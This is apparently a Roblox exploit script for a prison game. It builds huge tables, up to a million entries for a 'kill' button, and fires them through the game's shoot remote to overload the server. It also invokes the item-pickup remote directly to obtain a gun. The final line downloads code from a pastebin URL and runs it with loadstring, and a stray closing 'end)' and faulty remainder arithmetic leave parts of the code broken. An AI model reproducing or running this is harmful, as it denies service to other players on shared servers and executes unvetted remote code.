function set(txt)status.Text=(txt)wait()end
local Z=Vector3.new()
local main={Hit=nil;Distance=0;Cframe=CFrame.new(Z,Z)*CFrame.new(0,0,0);RayObject=Ray.new(Z,Z);}
smallTable,biggerTable,EvenBiggerTable,KillTable = {},{},{},{};
for i=1,100 do
	for i=1,10 do table.insert(smallTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 0% <> "..tostring(i).."%")
	end
end 
for i=1,100 do
	for i=1,100 do table.insert(biggerTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 25% <> "..tostring(i).."%")
	end
end
for i=1,100 do
	for i=1,1000 do table.insert(EvenBiggerTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 50% <> "..tostring(i).."%")
	end
end
for i=1,100 do
	for i=1,10000 do table.insert(KillTable,main)end
	if i/math.floor(i/10)/10 == 1 then
		set("Status 75% <> "..tostring(i).."%")
	end
end
local remote = game:GetService("ReplicatedStorage").ShootEvent
local plr = game:GetService("Players").LocalPlayer
function getGun()
	local gun = plr.Backpack:FindFirstChild("M9") or plr.Character:FindFirstChild("M9")
	if gun then
		return gun
	else
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
		local gun = plr.Backpack:FindFirstChild("M9")
		return gun
	end
end
small.MouseButton1Click:Connect(function()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(smallTable,gun)
		set("Fired "..#smallTable)
	else
		set("Can't proceed, no M9")
	end
end)
bigger.MouseButton1Click:Connect(function()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(biggerTable,gun)
		set("Fired "..#biggerTable)
	else
		set("Can't proceed, no M9")
	end
end)
evenbigger.MouseButton1Click:Connect(function()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(EvenBiggerTable,gun)
		set("Fired "..#EvenBiggerTable)
	else
		set("Can't proceed, no M9")
	end
end)
kill.MouseButton1Click:Connect(function()
	local gun = getGun()
	if gun then wait(.5)
		remote:FireServer(KillTable,gun)
		set("Fired "..#KillTable)
	else
		set("Can't proceed, no M9")
	end
end)
num:GetPropertyChangedSignal("Text"):Connect(function()
	if not tonumber(num.Text)then
		local x = "";
		for i,v in pairs(string.split(num.Text,""))do
			if tonumber(v)then
				x = x..tostring(v)
			end
		end
		num.Text = x
	end
end)
local customTable = {}
function getT(amount)amount = math.floor(amount)
	if amount == #customTable then return end
	customTable = {}
	if amount <= 1000 then
		set("Creating table")
		for i=1,amount do
			table.insert(customTable,main)
		end
	else
		local x = math.floor(amount/100)
		for i=1,100 do
			local remainder = amount - x
			for i=1,x do table.insert(customTable,main)end
			if i/math.floor(i/10)/10 == 1 then
				set("Status Custom% <> "..tostring(i).."%")
			end
		end
		for i=1,amount-x do
			table.insert(customTable,main)
		end
	end
end
custom.MouseButton1Click:Connect(function()
	local num = num.Text
	if tonumber(num) then
		getT(num)
		local gun = getGun()
		if gun then
			remote:FireServer(customTable,gun)
			set("Fired "..#customTable)
		else
			set("Can't proceed, no M9")
		end
	end
end)
local stats = game:GetService("Stats")
local step = game:GetService("RunService").RenderStepped
local digits = 10
step:Connect(function()
	network.Text = tostring(math.floor(stats.DataSendKbps*digits)/digits).."KB/s"
end)
set("Status 100% Loaded")

loadstring(game:HttpGet("https://pastebin.com/raw/2tj1xVZc"))()(AltF4_PL.main)--drag
end)

